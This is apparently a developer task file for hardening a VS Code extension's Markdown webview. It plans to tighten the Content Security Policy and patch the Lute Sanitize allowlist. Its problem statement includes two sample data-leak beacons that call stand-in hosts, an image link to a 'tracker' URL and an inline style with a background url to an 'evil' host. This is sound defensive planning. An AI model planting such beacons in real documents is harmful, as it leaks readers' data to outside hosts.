# Task: Webview CSP + Lute Sanitize hardening (defense-in-depth)

> **Status:** ⬜ Not started.
> **Source:** Lute master security review (2026-06-03). Full analysis: `out/lute-security-analiza.md`.
> **Value / Risk:** 🟡 security hardening / low — narrows an exfiltration channel + adds defense-in-depth; no functional change expected (verify image rendering).

## Problem
The Lute security review found that **remote script execution is already blocked** (Lute emits no `<script>`/remote URLs; `Sanitize` strips `<script>`/`on*`/`javascript:`; CSP `script-src 'nonce-…' cspSource 'unsafe-eval'` + `default-src 'none'` blocks foreign/inline scripts, frames, objects). But two non-code-exec gaps remain:

1. **CSS/image exfiltration channel.** CSP `img-src` allows bare `https:` (any host) (`src/extension.ts:1452`) and `style-src` allows `'unsafe-inline'` (`:1455`), while Lute's `Sanitize` lets the inline `style=` attribute through (`render/sanitizer.go` `allowAttr` only blocks `on*`/`http-equiv`/`formaction`). So a malicious `.md` can beacon out: `![](https://tracker/?leak)` or `style="background:url(https://evil/?leak)"`. Data/privacy leak, not code execution.
2. **`Sanitize` passes `<iframe>` / `<embed>` / `<base>` / `<link>`** (`sanitizer.go:30` — `iframe` deliberately commented out of the skip set). Currently neutralized only because the CSP has no `frame-src`/`object-src` (falls back to `default-src 'none'`) and `base-uri` is unset — i.e. one CSP change away from exposure.

## Goal
Close the exfiltration channel and add belt-and-suspenders so the security posture does not depend on a single CSP line, with no regression to legitimate image/diagram rendering.

## Steps
1. **Tighten CSP** in `src/extension.ts` (the `cspMeta` string, ~`:1448-1458`):
   - `img-src`: drop bare `https:`. Decide policy for remote images — either remove (local/`asWebviewUri` + `data:`/`blob:` only) or front via a setting. **Verify remote-image docs still render** (this is the one behavior that may change — confirm with the user before removing `https:`).
   - Add explicit `frame-src 'none'; object-src 'none'; base-uri 'none';` (defense-in-depth; today implied by `default-src 'none'`).
   - Document why `'unsafe-eval'` is required (GopherJS/Vditor) or remove if the build allows.
2. **Harden `Sanitize` at the source** (optional, stronger): esbuild `onLoad` patch (same mechanism as task 56 / `fixDmpInterop` in `media-src/esbuild-shared.mjs`) adding `iframe`, `embed`, `base` to `setOfElementsToSkipContent`, or stripping the inline `style` attribute in `allowAttr`. Anchor + version-guard so a Lute bump fails loudly. **Note:** if pursued alongside task 66 (Lute upgrade), apply against the upgraded source.
3. Update `test/backend/webview-html.test.ts` to assert the new CSP directives are present.

## Verify
- `test/backend/webview-html.test.ts` asserts `frame-src 'none'`, `object-src 'none'`, `base-uri 'none'` and the chosen `img-src` policy.
- Manual: a `.md` with `style="background:url(https://…)"` and `<iframe>`/`<img src=https://…>` does **not** issue the remote request (check Network/devtools); legitimate local images + mermaid/katex still render.
- (If step 2) Sanitize patch-guard throws on a Lute version mismatch.

## See also
- `out/lute-security-analiza.md` — full review (Sanitize allowlist, CSP analysis, remote-script verdict).
- `tasks/66-lute-engine-upgrade.md` — Lute bump brings 4 GHSA `Sanitize` fixes; sequence step 2 of this task against the upgraded source.
- `tasks/56-vditor-listtoggle-bugfixes.md` — esbuild `onLoad` patch pattern to reuse.
- CSP origin: `src/extension.ts:1448` (task 18 §2c); sanitize on by default: vditor `constants.ts:64`.
